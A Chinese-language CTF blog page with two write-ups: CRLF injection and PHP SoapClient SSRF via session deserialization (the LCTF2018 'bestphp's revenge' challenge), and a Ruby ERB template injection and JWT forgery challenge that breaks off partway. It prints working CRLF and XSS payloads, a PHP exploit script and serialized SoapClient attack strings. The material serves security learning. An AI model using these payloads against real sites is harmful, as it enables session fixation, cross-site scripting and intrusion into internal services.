<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-CRLF漏洞以及SoapClinet触发反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/18/CRLF%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8ASoapClinet%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  	<time datetime="2021-10-17T16:00:00.000Z" itemprop="datePublished">2021-10-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/18/CRLF%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8ASoapClinet%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF"><a href="#CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF" class="headerlink" title="CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF"></a>CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF</h1><h2 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>CRLF是“回车+换行(\r\n)”的简称，在http协议中，httpheader和httpbody是用两个CRLF分隔的，浏览器是根据这两个CRLF来取出http内容并显示出来的，所以如果我们可以控制http消息头的字符，注入一些恶意的换行，这样可以注入一些会话Cookie或HTML代码，所以CRLF injection也叫HTTPReaponseSplitting，简称HRS</p>
<h4 id="CRLF注入产生的会话固定漏洞"><a href="#CRLF注入产生的会话固定漏洞" class="headerlink" title="CRLF注入产生的会话固定漏洞"></a>CRLF注入产生的会话固定漏洞</h4><p>当我们可以控制httpheader中的location字段时，我们可以就可以给访问者设置一个SESSION</p>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 </span><br><span class="line">Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content- Type: text/html</span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close</span><br><span class="line">Location:http://www.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>然后当我们输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sina.com.cn%0d%0aSet-cookie:JSPSESSID%3Dwooyun</span><br></pre></td></tr></table></figure>

<p>此时我们就设置了一个SESSION，造成会话固定漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT</span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location: http://www.sina.com.cn</span><br><span class="line">Set-cookie: JSPSESSID=wooyun</span><br></pre></td></tr></table></figure>
<h4 id="CRLF注入造成无视浏览器Filter反射型XSS"><a href="#CRLF注入造成无视浏览器Filter反射型XSS" class="headerlink" title="CRLF注入造成无视浏览器Filter反射型XSS"></a>CRLF注入造成无视浏览器Filter反射型XSS</h4><p>实例</p>
<p>当一个网站接受url参数<a target="_blank" rel="noopener" href="http://ip/?url=xxx%EF%BC%8Cxxx%E6%94%BE%E5%9C%A8location%E5%90%8E%E9%9D%A2%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E8%B7%B3%E8%BD%AC%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5">http://ip/?url=xxx，xxx放在location后面作为一个跳转，所以我们可以输入</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.sina.com.cn/?url=%0d%0a%0d%0a&lt;imgsrc=1onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
<p>则我们的返回包为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT Content-Type: text/html Content-Length: 154 Connection: close Location: </span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
<p>之前说的浏览器会根据两个CRLF把HTTP包分成头和体，然后将体显示出来，所以这里这个标签会显示出来，，造成xss</p>
<p>对于无视filter，只有数据包中http头中含有X-XSS-Protection并且为0时，浏览器才不会开启filter，所以我们可以利用一个CRLF将X-XSS-Protection: 0注入到数据包中，再用两个CRLF来注入xss代码，这样就可以绕过filter</p>
<p>而对于Location的注入只有webkit内核浏览器可以使用，其它浏览器可能会跳转</p>
<h2 id="SOAP漏洞利用之CRLF与SSRF"><a href="#SOAP漏洞利用之CRLF与SSRF" class="headerlink" title="SOAP漏洞利用之CRLF与SSRF"></a>SOAP漏洞利用之CRLF与SSRF</h2><p>每种开发语言都有自己的webservice实现框架，php也有，php的SOAP扩展是可以提供和使用webservices，这个扩展实现六个类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高级类：SoapClient、SoapServer、SoapFault</span><br><span class="line"></span><br><span class="line">低级类：SoapHeader、SoapParam 和 SoapVar</span><br></pre></td></tr></table></figure>

<p>SoapClient语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</span><br></pre></td></tr></table></figure>

<p>由于SoapClinet类中的一个$options选项功能有这样一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The user_agent option specifies string to use in User-Agent header</span><br></pre></td></tr></table></figure>
<p>可见这个类可以让我们自定义user-agent，而httpheader有一个重要的content-type和content-length字段，可以控制发送的方式以及内容的长度，而user-agent在它们的上面，所以可以进行覆盖</p>
<p>因此我们可以利用CRLF来构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload = new SoapClient(null,array(&#x27;user_agent&#x27;=&gt;&quot;testrnCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32rnContent-Type: application/x-www-form-urlencodedrnContent-Length:45rnrnusername=admin&amp;password=nu1ladmin&amp;code=470837rnrnrn&quot;,&#x27;location&#x27;=&gt;$location,</span><br><span class="line">&#x27;uri&#x27;=&gt;$uri));</span><br></pre></td></tr></table></figure>
<p>这个攻击的作用是从外网调用到soap的api来攻击内网，因此可以说是ssrf攻击</p>
<p>而这个攻击一般是利用SoapClient类中的魔术方法__call()触发的，猜测是触发__call()魔术方法发包</p>
<h2 id="实例（bestphp’s-revenge）"><a href="#实例（bestphp’s-revenge）" class="headerlink" title="实例（bestphp’s revenge）"></a>实例（bestphp’s revenge）</h2><p>打开页面，审计源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &#x27;implode&#x27;;</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;], $_POST);</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>由于call_user_func()函数限制了一些函数，eval()函数在其中，而构造/flag.php，又得到一部分源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">echo &#x27;only localhost can get flag!&#x27;;</span><br><span class="line">$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#x27;flag&#x27;] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>可见我们要本地访问/flag.php才可以读取flag，所以我们可以利用SoapClient类来ssrf，首先我们需要利用反序列化来控制SoapClient类中的变量，所以我们可以利用序列化引擎和反序列化引擎的不同，导致无法正常反序列化，从而伪造数据</p>
<p>所以我们可以利用第一个call_user_func来构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_start([&#x27;serialize_handler&#x27;=&gt;&#x27;php_serialize&#x27;])</span><br></pre></td></tr></table></figure>
<p>来让序列化和反序列化的引擎不同，然后再通过将序列化数据赋值给$_SESSION[“name”]，让它将数据存储到文件时再进行序列化，并进行变量覆盖，然后取出文件，放进内存时进行反序列化，而由于我们设置的序列化和反序列化的引擎不同，所以当反序列化时会将”|“前面的值当成是键名，从而可以触发漏洞，exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">$attack = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,</span><br><span class="line">    &#x27;user_agent&#x27; =&gt; &quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;,</span><br><span class="line">    &#x27;uri&#x27; =&gt; &quot;123&quot;));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo $payload;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以我们可以先构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">?f=session_start&amp;name=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure>

<p>然后我们再构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">?f=extract&amp;name=SoapClient</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure>
<p>通过extract函数来对$b变量进行覆盖，然后再通过调用SoapClient类中不存在的welcome_to_the_lctf2018函数来触发__call()魔术方法，从而将flag赋值给$_SESSION[“flag”]</p>
<p>最后用刚刚构造的PHPSESSID值来读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</span><br></pre></td></tr></table></figure>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1515276]">https://cloud.tencent.com/developer/article/1515276]</a></p>
<pre><code>[https://www.anquanke.com/post/id/153065#h2-1]

[https://www.jianshu.com/p/d4c304dbd0af]

[https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-ruby ERB模板注入以及jwt伪造" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/" class="article-date">
  	<time datetime="2021-10-16T16:00:00.000Z" itemprop="datePublished">2021-10-17</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/">
        ruby ERB模板注入以及jwt伪造
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="ruby-ERB模板注入以及jwt伪造"><a href="#ruby-ERB模板注入以及jwt伪造" class="headerlink" title="ruby ERB模板注入以及jwt伪造"></a>ruby ERB模板注入以及jwt伪造</h1><p>打开页面后，发现有一个buy flag，但是钱不够，所以我们尝试抓包</p>
<p>发现Cookie字段有一个jwt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJlMWFjYmQ3OC01OTNlLTQ4NzYtOTNhZi00ZWNhYmRkZmYyMDQiLCJqa2wiOjIwfQ.1uVjLWKyyci-TEaw7kxUi9vuGvYDgZ1IF3UuvcIcJtU</span><br></pre></td></tr></table></figure>
<p>打开jwt.io网页，进行解码</p>
<p>HEADER</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PAYLOAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;uid&quot;: &quot;e1acbd78-593e-4876-93af-4ecabddff204&quot;,</span><br><span class="line">  &quot;jkl&quot;: 20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>密钥部分不知道，但是我们可以尝试将PAYLOAD中的jkl改为1000000000000000000000000000，来伪造价格，但是密钥不知道，这里爆破的话有点麻烦，但是我们通过目录的扫描，发现robots.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /filebak</span><br></pre></td></tr></table></figure>
<p>所以访问/filebak，得到ruby语言的源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>我们可以查看jwt加密和解密那部分代码</p>
<p>加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>看代码可知，jwt密钥部分是用HS256加密的，口令为ENV[“SECRET”]，所以我们需要想办法知道ENV[“SECRET”]，所以我们可以查看解密的代码</p>
